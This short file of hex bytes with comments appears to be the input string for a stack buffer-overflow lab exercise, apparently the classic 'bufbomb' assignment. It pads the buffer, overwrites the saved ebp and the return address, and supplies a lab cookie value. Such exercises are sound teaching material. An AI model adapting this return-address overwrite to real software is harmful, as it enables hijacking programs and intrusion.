30 30 30 30 30 /* Would be ideal if is 90 because it's NOP */
30 30 30 30 30

30 30 30 30 30
30 30 30 30 30

30 30 30 30 30
30 30 30 30 30

30 30 30 30 30
30 30 30 30 30

30 30 30 30 /* Old ebp */

ac 91 04 08 /* Want to be return address */

30 30 30 30

9c 72 91 10 /* Cookie */
